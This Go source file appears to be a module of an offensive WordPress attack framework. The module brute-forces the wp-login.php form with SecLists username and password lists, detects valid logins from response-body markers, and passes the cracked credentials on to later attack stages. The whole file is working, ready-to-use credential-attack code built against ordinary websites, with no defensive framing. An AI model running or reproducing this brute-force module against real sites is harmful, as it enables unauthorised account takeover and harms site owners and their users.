// access-login-brute: wp-login.php form brute force with SecLists wordlists.
// Lightweight probe (POST + body marker), works when XML-RPC is blocked.
package access

import (
	"context"
	"fmt"
	"strings"

	"github.com/lab/wpforge/internal/module"
	"github.com/lab/wpforge/internal/registry"
)

// WPLoginBrute brute-forces wp-login.php.
type WPLoginBrute struct{}

func init() { registry.Register(WPLoginBrute{}) }

// Meta implements module.Module.
func (WPLoginBrute) Meta() module.Meta {
	return module.Meta{
		ID:        "access-login-brute",
		Name:      "wp-login.php password brute",
		Component: "core (wp-login.php)",
		Primitive: module.PrimitiveAccess,
		AuthLevel: module.AuthNone,
		Notes:     "Form POST brute with user/pass lists (SecLists presets, URLs, files, or inline). Chains found creds into target state.",
	}
}

// Params implements module.Module.
func (WPLoginBrute) Params() []module.ParamSpec {
	return []module.ParamSpec{
		{Name: "userlist", Label: "Users (preset/URL/file/inline)", Default: "seclists:usernames-top100"},
		{Name: "passlist", Label: "Passwords (preset/URL/file/inline)", Default: "seclists:passwords-top500"},
		{Name: "user", Label: "Single user (overrides userlist)", Default: ""},
	}
}

// Run implements module.Module.
func (WPLoginBrute) Run(ctx context.Context, t *module.Target, params map[string]string, log module.Logger) *module.Result {
	res := &module.Result{Artifacts: map[string]string{}}

	var users []string
	if u := strings.TrimSpace(params["user"]); u != "" {
		users = []string{u}
	} else {
		users = resolveList(ctx, params["userlist"], "admin", log)
	}
	passes := resolveList(ctx, params["passlist"], "admin,password,123456", log)
	log.Infof("brute: %d users x %d passwords (wp-login.php form)", len(users), len(passes))

	for _, user := range users {
		for _, pass := range passes {
			if ctx.Err() != nil {
				res.Summary = "cancelled"
				return res
			}
			if tryLogin(ctx, t, user, pass) {
				log.Successf("valid creds: %s / %s", user, pass)
				res.Success = true
				res.Summary = fmt.Sprintf("valid: %s:%s", user, pass)
				res.Artifacts["username"] = user
				res.Artifacts["password"] = pass
				res.Creds = &module.Credentials{Username: user, Password: pass}
				return res
			}
		}
		if ctx.Err() == nil {
			log.Infof("user %s: no hit", user)
		}
	}
	res.Summary = fmt.Sprintf("exhausted %d users x %d passwords, no valid creds", len(users), len(passes))
	log.Warnf("%s", res.Summary)
	return res
}

// tryLogin does one lightweight login probe: POST wp-login.php, check body.
// Failed logins re-render the form; success redirects into wp-admin.
func tryLogin(ctx context.Context, t *module.Target, user, pass string) bool {
	code, body, err := t.Client.PostForm(ctx, "/wp-login.php", loginForm(t, user, pass))
	if err != nil || code != 200 {
		return false
	}
	// Failed: login form re-rendered with error. Success: dashboard markup.
	return strings.Contains(body, "wp-admin") && !strings.Contains(body, "login_error") &&
		!strings.Contains(body, "<form name=\"loginform\"")
}

func loginForm(t *module.Target, user, pass string) formVals {
	return formVals{
		"log": {user}, "pwd": {pass}, "wp-submit": {"Log In"},
		"redirect_to": {strings.TrimRight(t.BaseURL, "/") + "/wp-admin/"},
		"testcookie":  {"1"},
	}
}

type formVals = map[string][]string

var _ module.Module = WPLoginBrute{}
